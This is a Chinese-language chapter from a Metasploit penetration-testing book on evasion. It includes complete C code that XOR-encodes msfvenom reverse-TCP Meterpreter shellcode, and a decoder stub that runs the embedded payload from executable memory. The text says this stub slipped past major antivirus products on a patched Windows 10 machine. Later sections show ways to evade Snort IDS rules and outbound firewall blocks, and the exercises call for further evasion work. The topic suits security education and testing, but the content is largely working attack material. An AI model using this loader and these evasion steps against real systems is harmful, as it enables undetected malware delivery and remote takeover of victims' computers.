# 第十九章：Metasploit 的逃避

在过去的八章中，我们已经涵盖了渗透测试的主要阶段。在本章中，我们将包括渗透测试人员在现实场景中可能遇到的问题。过去的简单攻击可以在 Metasploit 中弹出一个 shell 的日子已经一去不复返。随着攻击面的增加，安全视角也逐渐增加。因此，需要巧妙的机制来规避各种性质的安全控制。在本章中，我们将探讨可以防止部署在目标端点的安全控制的不同方法和技术。在本章的整个过程中，我们将涵盖：

+   绕过 AV 检测 Meterpreter 负载

+   绕过 IDS 系统

+   绕过防火墙和被阻止的端口

所以，让我们开始逃避技术。

# 使用 C 封装和自定义编码器规避 Meterpreter

Meterpreter 是安全研究人员使用最广泛的负载之一。然而，由于其流行，大多数 AV 解决方案都会检测到它，并很快被标记。让我们使用 `msfvenom` 生成一个简单的 Metasploit 可执行文件，如下所示：

![](img/5ddba1a4-be28-4168-a7c0-8a0d8ba862bf.png)

我们使用 `msfvenom` 命令创建了一个简单的反向 TCP Meterpreter 可执行后门。此外，我们已经提到了 `LHOST` 和 `LPORT`，然后是格式，即 PE/COFF 可执行文件的 EXE。我们还通过使用 `-b` 开关来防止空字符、换行和回车坏字符。我们可以看到可执行文件已成功生成。让我们将这个可执行文件移动到 `apache` 文件夹，并尝试在由 Windows Defender 和奇虎 360 杀毒软件保护的 Windows 10 操作系统上下载并执行它。但是，在运行之前，让我们按照以下方式启动匹配处理程序：

![](img/bef384f4-f63f-4844-9cd0-38256e707d93.png)

我们可以看到我们在端口 `4444` 上启动了一个匹配处理程序作为后台作业。让我们尝试在 Windows 系统上下载并执行 Meterpreter 后门，并检查是否能够获得反向连接：

![](img/d4903df9-f206-402c-b47c-81b1df91c631.png)

哎呀！看起来 AV 甚至不允许文件下载。嗯，在普通 Meterpreter 负载后门的情况下，这是相当典型的。让我们快速计算 `Sample.exe` 文件的 MD5 哈希如下：

![](img/5dee96cb-1a90-4cd1-84f4-76a000e0d789.png)

让我们检查一个流行的在线 AV 扫描器上的文件，比如 [`nodistribute.com/`](http://nodistribute.com/)，如下所示：

![](img/82eb15e4-d099-4cb8-ade2-55f35220f0e4.png)

嗯！我们可以看到 27/37 个杀毒软件解决方案检测到了该文件。相当糟糕，对吧？让我们看看如何通过使用 C 编程和一点编码来规避这种情况。让我们开始吧。

# 在 C 中编写自定义 Meterpreter 编码器/解码器

为了规避目标的安全控制，我们将使用自定义编码方案，比如 XOR 编码，然后再加上一两种其他编码。此外，我们将不使用传统的 PE/COFF 格式，而是生成 shellcode 来解决问题。让我们像之前为 PE 格式那样使用 `msfvenom`。但是，我们将把输出格式改为 C，如下面的截图所示：

![](img/68131936-78fd-4fcf-a68a-67838e2e55b4.png)

查看 `Sample.c` 文件的内容，我们有以下内容：

![](img/57947eb7-ddcf-441f-9ddf-e13d88ab5f29.png)

由于我们已经准备好 shellcode，我们将在 C 中构建一个编码器，它将使用我们选择的字节 `0xAA` 进行 XOR 编码，如下所示：

![](img/ce358121-f247-4bc6-ab51-9f6077d8e11a.png)

让我们看看如何创建一个 C 编码器程序，如下所示：

```
#include <Windows.h>
#include "stdafx.h"
#include <iostream>
#include <iomanip>
#include <conio.h>
unsigned char buf[] =
"\xbe\x95\xb2\x95\xfe\xdd\xc4\xd9\x74\x24\xf4\x5a\x31\xc9\xb1"
"\x56\x83\xc2\x04\x31\x72\x0f\x03\x72\x9a\x50\x60\x02\x4c\x16"
"\x8b\xfb\x8c\x77\x05\x1e\xbd\xb7\x71\x6a\xed\x07\xf1\x3e\x01"
"\xe3\x57\xab\x92\x81\x7f\xdc\x13\x2f\xa6\xd3\xa4\x1c\x9a\x72"
"\x26\x5f\xcf\x54\x17\x90\x02\x94\x50\xcd\xef\xc4\x09\x99\x42"
"\xf9\x3e\xd7\x5e\x72\x0c\xf9\xe6\x67\xc4\xf8\xc7\x39\x5f\xa3"
"\xc7\xb8\x8c\xdf\x41\xa3\xd1\xda\x18\x58\x21\x90\x9a\x88\x78"
"\x59\x30\xf5\xb5\xa8\x48\x31\x71\x53\x3f\x4b\x82\xee\x38\x88"
"\xf9\x34\xcc\x0b\x59\xbe\x76\xf0\x58\x13\xe0\x73\x56\xd8\x66"
"\xdb\x7a\xdf\xab\x57\x86\x54\x4a\xb8\x0f\x2e\x69\x1c\x54\xf4"
"\x10\x05\x30\x5b\x2c\x55\x9b\x04\x88\x1d\x31\x50\xa1\x7f\x5d"
"\x95\x88\x7f\x9d\xb1\x9b\x0c\xaf\x1e\x30\x9b\x83\xd7\x9e\x5c"
"\x92\xf0\x20\xb2\x1c\x90\xde\x33\x5c\xb8\x24\x67\x0c\xd2\x8d"
"\x08\xc7\x22\x31\xdd\x7d\x29\xa5\x1e\x29\x27\x50\xf7\x2b\x38"
"\x8b\x5b\xa2\xde\xfb\x33\xe4\x4e\xbc\xe3\x44\x3f\x54\xee\x4b"
"\x60\x44\x11\x86\x09\xef\xfe\x7e\x61\x98\x67\xdb\xf9\x39\x67"
"\xf6\x87\x7a\xe3\xf2\x78\x34\x04\x77\x6b\x21\x73\x77\x73\xb2"
"\x16\x77\x19\xb6\xb0\x20\xb5\xb4\xe5\x06\x1a\x46\xc0\x15\x5d"
"\xb8\x95\x2f\x15\x8f\x03\x0f\x41\xf0\xc3\x8f\x91\xa6\x89\x8f"
"\xf9\x1e\xea\xdc\x1c\x61\x27\x71\x8d\xf4\xc8\x23\x61\x5e\xa1"
"\xc9\x5c\xa8\x6e\x32\x8b\xaa\x69\xcc\x49\x85\xd1\xa4\xb1\x95"
"\xe1\x34\xd8\x15\xb2\x5c\x17\x39\x3d\xac\xd8\x90\x16\xa4\x53"
"\x75\xd4\x55\x63\x5c\xb8\xcb\x64\x53\x61\xfc\x1f\x1c\x96\xfd"
"\xdf\x34\xf3\xfe\xdf\x38\x05\xc3\x09\x01\x73\x02\x8a\x36\x8c"
"\x31\xaf\x1f\x07\x39\xe3\x60\x02";

int main()
{
 for (unsigned int i = 0; i < sizeof buf; ++i)
 {
  if (i % 15 == 0)
  {
   std::cout << "\"\n\"";
  }
  unsigned char val = (unsigned int)buf[i] ^ 0xAA;
  std::cout << "\\x" << std::hex << (unsigned int)val;
 }
 _getch();
 return 0;
}
```

这是一个直接的程序，我们将生成的 shellcode 复制到一个数组`buf[]`中，然后简单地迭代并对每个字节使用`0xAA`字节进行 Xor，并将其打印在屏幕上。编译和运行此程序将输出以下编码的有效负载：

![](img/13486eca-c31a-4283-8d79-fd9e11831a9a.png)

现在我们有了编码的有效负载，我们需要编写一个解密存根可执行文件，它将在执行时将此有效负载转换为原始有效负载。解密存根可执行文件实际上将是交付给目标的最终可执行文件。要了解目标执行解密存根可执行文件时会发生什么，我们可以参考以下图表：

![](img/451beaca-4d35-40d9-972e-c0b20d37a8b6.png)

我们可以看到，在执行时，编码的 shellcode 被解码为其原始形式并执行。让我们编写一个简单的 C 程序来演示这一点，如下所示：

```
#include"stdafx.h"
#include <Windows.h>
#include <iostream>
#include <iomanip>
#include <conio.h>
unsigned char encoded[] =
"\x14\x3f\x18\x3f\x54\x77\x6e\x73\xde\x8e\x5e\xf0\x9b\x63\x1b"
"\xfc\x29\x68\xae\x9b\xd8\xa5\xa9\xd8\x30\xfa\xca\xa8\xe6\xbc"
"\x21\x51\x26\xdd\xaf\xb4\x17\x1d\xdb\xc0\x47\xad\x5b\x94\xab"
"\x49\xfd\x01\x38\x2b\xd5\x76\xb9\x85\xc\x79\x0e\xb6\x30\xd8"
"\x8c\xf5\x65\xfe\xbd\x3a\xa8\x3e\xfa\x67\x45\x6e\xa3\x33\xe8"
"\x53\x94\x7d\xf4\xd8\xa6\x53\x4c\xcd\x6e\x52\x6d\x93\xf5\x9"
"\x6d\x12\x26\x75\xeb\x9\x7b\x70\xb2\xf2\x8b\x3a\x30\x22\xd2"
"\xf3\x9a\x5f\x1f\x2\xe2\x9b\xdb\xf9\x95\xe1\x28\x44\x92\x22"
"\x53\x9e\x66\xa1\xf3\x14\xdc\x5a\xf2\xb9\x4a\xd9\xfc\x72\xcc"
"\x71\xd0\x75\x01\xfd\x2c\xfe\xe0\x12\xa5\x84\xc3\xb6\xfe\x5e"
"\xba\xaf\x9a\xf1\x86\xff\x31\xae\x22\xb7\x9b\xfa\xb\xd5\xf7"
"\x3f\x22\xd5\x37\x1b\x31\xa6\x5\xb4\x9a\x31\x29\x7d\x34\xf6"
"\x38\x5a\x8a\x18\xb6\x3a\x74\x99\xf6\x12\x8e\xcd\xa6\x78\x27"
"\xa2\x6d\x88\x9b\x77\xd7\x83\xf\xb4\x83\x8d\xfa\x5d\x81\x92"
"\x21\xf1\x8\x74\x51\x99\x4e\xe4\x16\x49\xee\x95\xfe\x44\xe1"
"\xca\xee\xbb\x2c\xa3\x45\x54\xd4\xcb\x32\xcd\x71\x53\x93\xcd"
"\x5c\x2d\xd0\x49\x58\xd2\x9e\xae\xdd\xc1\x8b\xd9\xdd\xd9\x18"
"\xbc\xdd\xb3\x1c\x1a\x8a\x1f\x1e\x4f\xac\xb0\xec\x6a\xbf\xf7"
"\x12\x3f\x85\xbf\x25\xa9\xa5\xeb\x5a\x69\x25\x3b\xc\x23\x25"
"\x53\xb4\x40\x76\xb6\xcb\x8d\xdb\x27\x5e\x62\x89\xcb\xf4\xb"
"\x63\xf6\x2\xc4\x98\x21\x00\xc3\x66\xe3\x2f\x7b\xe\x1b\x3f"
"\x4b\x9e\x72\xbf\x18\xf6\xbd\x93\x97\x6\x72\x3a\xbc\xe\xf9"
"\xdf\x7e\xff\xc9\xf6\x12\x61\xce\xf9\xcb\x56\xb5\xb6\x3c\x57"
"\x75\x9e\x59\x54\x75\x92\xaf\x69\xa3\xab\xd9\xa8\x20\x9c\x26"
"\x9b\x5\xb5\xad\x93\x49\xca\xa8\xaa";
int main()
{
 void *exec = VirtualAlloc(0, sizeof encoded, MEM_COMMIT, PAGE_EXECUTE_READWRITE);

 for (unsigned int i = 0; i < sizeof encoded; ++i)
 {
  unsigned char val = (unsigned int)encoded[i] ^ 0xAA;
  encoded[i] = val;
 }
 memcpy(exec, encoded, sizeof encoded);
 ((void(*)())exec)();
 return 0;
}
```

再次，一个非常直接的程序；我们使用`VirtualAlloc`函数在调用程序的虚拟地址空间中保留空间。我们还使用`memcpy`将解码后的字节复制到`VirtualAlloc`指针保留的空间中。接下来，我们执行指针处保存的字节。所以，让我们测试一下我们的程序，看看它在目标环境中的运行情况。我们将按照相同的步骤进行；让我们找到程序的 MD5 哈希如下：

![](img/5618bdf3-5ade-4f9e-b88b-976fbf72bf8d.png)

让我们尝试下载和执行程序如下：

![](img/8a548de0-bb45-4956-bf86-535ab30927cd.png)

下载没有问题！耶！这是一个正常的弹出窗口，显示文件未知；没有什么可担心的。让我们尝试执行文件，如下所示：

![](img/bbc42f2a-c24d-47b1-a6a3-03b2a9a71ff5.png)

砰砰！我们成功获得了在 64 位 Windows 10 操作系统上运行奇虎 360 高级杀毒软件的目标的 Meterpreter 访问权限，完全受保护和补丁。让我们也在[`nodistribute.com/`](http://nodistribute.com/)上试一试：

![](img/62fdbbdc-e501-4dc3-bd18-2a3cf0d58605.png)

我们可以看到，一些杀毒软件解决方案仍然将可执行文件标记为恶意软件。然而，我们的技术绕过了一些主要的参与者，包括 Avast、AVG、Avira、卡巴斯基、Comodo，甚至诺顿和麦克菲。其余的九个杀毒软件解决方案也可以通过一些技巧绕过，比如延迟执行、文件泵送等。让我们通过右键单击并使用奇虎 360 杀毒软件进行扫描来确认检查：

![](img/564f4424-7c8a-4f16-9faa-fa509d952776.png)

一切都没有问题！在整个过程中，我们看到了有效负载从可执行状态到 shellcode 形式的过程。我们看到了一个小型自定义解码器应用程序在绕过 AV 解决方案时的神奇效果。

# 使用 Metasploit 规避入侵检测系统

如果入侵检测系统存在，您在目标上的会话可能会很短暂。Snort，一种流行的 IDS 系统，可以在发现网络上的异常时生成快速警报。考虑以下利用启用了 Snort IDS 的目标的 Rejetto HFS 服务器的情况：

![](img/2cd53825-34da-4496-9c8e-0c311c4a519f.png)

我们可以看到我们成功获得了 Meterpreter 会话。然而，右侧的图像显示了一些一级问题。我必须承认，Snort 团队和社区创建的规则非常严格，有时很难绕过。然而，为了最大限度地覆盖 Metasploit 规避技术，并为了学习的目的，我们创建了一个简单的规则来检测易受攻击的 HFS 服务器上的登录，如下所示：

```
alert tcp $EXTERNAL_NET any -> $HOME_NET $HTTP_PORTS (msg:"SERVER-WEBAPP Rejetto HttpFileServer Login attempt"; content:"GET"; http_method; classtype:web-application-attack; sid:1000001;) 
```

上述规则是一个简单的规则，建议如果来自外部网络的任何`GET`请求在 HTTP 端口上使用任何端口到目标网络，则必须显示消息。您能想到我们如何绕过这样一个标准规则吗？让我们在下一节讨论一下。

# 使用随机案例进行娱乐和利润

由于我们正在处理 HTTP 请求，我们可以始终使用 Burp repeater 来帮助快速测试。因此，让我们并排使用 Snort 和 Burp 进行一些测试：

![](img/73fdda54-4a07-4b89-bb2e-2d418a4e7bc1.png)

我们可以看到，一旦我们向目标 URI 发送请求，它就会被记录到 Snort 中，这不是好消息。尽管如此，我们看到了规则，我们知道 Snort 试图将`GET`的内容与请求中的内容进行匹配。让我们尝试修改`GET`请求的大小写并重复请求如下：

![](img/1db79df2-d221-4e13-93f7-a4f92acdc3ed.png)

没有生成新的日志！很好。我们刚刚看到了如何改变方法的大小写并愚弄一个简单的规则。但是，我们仍然不知道如何在 Metasploit 中实现这种技术。让我向你介绍规避选项：

![](img/487c0e72-9ed9-4e9f-9170-720ab9a94986.png)

我们可以看到有很多规避选项可供我们选择。我知道你已经猜到了这一点。但是，如果你没有，我们将在这里使用`HTTP::method_random_case`选项，并按以下方式重试利用：

![](img/ac405b5a-334a-42a4-9725-40499fb22887.png)

让我们按以下方式利用目标：

![](img/9a0e1ff6-5c30-4c9f-ba54-2d71eff3c127.png)

我们很干净！是的！我们轻松地规避了规则。让我们在下一节中尝试一些更复杂的场景。

# 使用伪装目录来愚弄 IDS 系统

与以前的方法类似，我们可以在 Metasploit 中使用伪装目录来最终得出相同的结论。让我们看看以下规则集：

![](img/407ae463-d3a1-4c57-b2e4-0d723ab9daf1.png)

我们可以看到前面的 Snort 规则检查传入数据包中的`POST /script`内容。我们可以用多种方法做到这一点，但让我们使用一种新方法，即伪装目录关系。这种技术将在到达相同目录时添加以前的随机目录；例如，如果文件存在于`/Nipun/abc.txt`文件夹中，模块将使用类似`/root/whatever/../../Nipun/abc.txt`的内容，这意味着它使用了其他目录，最终又回到了相同的目录。因此，这使得 URL 足够长，以提高 IDS 的效率循环。让我们考虑一个例子。

在这个练习中，我们将使用 Jenkins `script_console`命令执行漏洞来利用运行在`192.168.1.149`上的目标，如下截图所示：

![](img/c907e3c3-7398-42ce-a58d-cce8bf2c269f.png)

我们可以看到 Jenkins 运行在目标 IP `192.168.1.149`的端口`8888`上。让我们使用`exploit/multi/http/Jenkins_script_console module`来利用目标。我们已经设置了`RHOST`、`RPORT`和`TARGEURI`等选项。让我们来利用系统：

![](img/282a21d7-4f4d-4482-9058-24b757373cc1.png)

成功！我们可以看到我们轻松地获得了对目标的 Meterpreter 访问。让我们看看 Snort 为我们准备了什么：

![](img/791e6f5d-44fa-41db-8995-a42338f3f550.png)

看起来我们刚刚被发现了！让我们在 Metasploit 中设置以下规避选项：

![](img/7a7c47d8-51c4-42fd-872d-c1961127b156.png)

现在让我们重新运行利用程序，看看 Snort 中是否有任何信息：

![](img/62879983-1596-4577-a2a3-0299424c4a38.png)

Snort 中没有任何信息！让我们看看我们的利用进行得如何：

![](img/13dfb0f9-c600-45f8-a2f5-032de9a54477.png)

不错！我们再次规避了 Snort！随意尝试所有其他 Snort 规则，以更好地了解幕后的运作方式。

# 绕过 Windows 防火墙封锁的端口

当我们尝试在 Windows 目标系统上执行 Meterpreter 时，可能永远无法获得 Meterpreter 访问。这在管理员封锁了系统上的特定端口时很常见。在这个例子中，让我们尝试用一个聪明的 Metasploit 有效载荷来规避这种情况。让我们快速设置一个场景如下：

![](img/6cda48ca-1c52-4569-b2c1-084aa6d00543.png)

我们可以看到我们已经设置了一个新的防火墙规则，并指定了端口号`4444-6666`。继续下一步，我们将选择阻止这些出站端口，如下面的屏幕截图所示：

![](img/40a2eaf4-aeeb-45db-8583-99911e206125.png)

让我们检查防火墙状态和我们的规则：

![](img/23ccbae1-c8af-4084-9004-c5a20638767b.png)

我们可以看到规则已经设置，并且我们的防火墙在家庭和公共网络上都已启用。考虑到我们在目标上运行了 Disk Pulse Enterprise 软件。我们已经在前几章中看到我们可以利用这个软件。让我们尝试执行利用：

![](img/40216a0d-611c-46ab-ab4a-d882cc6a596b.png)

我们可以看到利用确实运行了，但我们没有访问目标，因为防火墙在端口`4444`上阻止了我们。

# 在所有端口上使用反向 Meterpreter

为了规避这种情况，我们将使用`windows/meterpreter/reverse_tcp_allports`有效载荷，它将尝试每个端口，并为我们提供对未被阻止的端口的访问。此外，由于我们只在端口`4444`上监听，我们需要将所有随机端口的流量重定向到我们端口`4444`。我们可以使用以下命令来实现：

![](img/f24bc475-e0db-4ff5-a6f9-7a1114e18c9d.png)

让我们再次使用反向`tcp meterpreter`有效载荷在所有端口上执行利用：

![](img/5c34c905-caf8-4991-a477-bff3f8c5205d.png)

我们可以看到我们轻松地获得了对目标的 Meterpreter 访问。我们规避了 Windows 防火墙并获得了 Meterpreter 连接。这种技术在管理员对入站和出站端口采取积极态度的情况下非常有益。

此时，您可能会想知道前面的技术是否很重要，对吗？或者，您可能会感到困惑。让我们在 Wireshark 中查看整个过程，以了解数据包级别的情况：

![](img/0d1244a2-1930-4363-ae33-3510937c9db4.png)

我们可以看到最初，来自我们 kali 机器的数据被发送到端口`80`，导致缓冲区溢出。一旦攻击成功，目标系统与端口`6667`（在被阻止的端口范围之后的第一个端口）建立了连接。此外，由于我们将所有端口从`4444-7777`路由到端口`4444`，它被路由并最终回到端口`4444`，我们获得了 Meterpreter 访问权限。

# 总结和练习

在本章中，我们学习了使用自定义编码器的 AV 规避技术，我们绕过了 IDS 系统的签名匹配，还使用了所有 TCP 端口 Meterpreter 有效载荷避开了 Windows 防火墙封锁的端口。

您可以尝试以下练习来增强您的规避技能：

+   尝试延迟有效载荷的执行，而不使用解码器中的`sleep()`函数，并分析检测比率的变化

+   尝试使用其他逻辑操作，如 NOT，双重 XOR，并使用简单的密码，如 ROT 与有效载荷

+   绕过至少 3 个 Snort 签名并修复它们

+   学习并使用 SSH 隧道来绕过防火墙

下一章将大量依赖这些技术，并深入探讨 Metasploit。
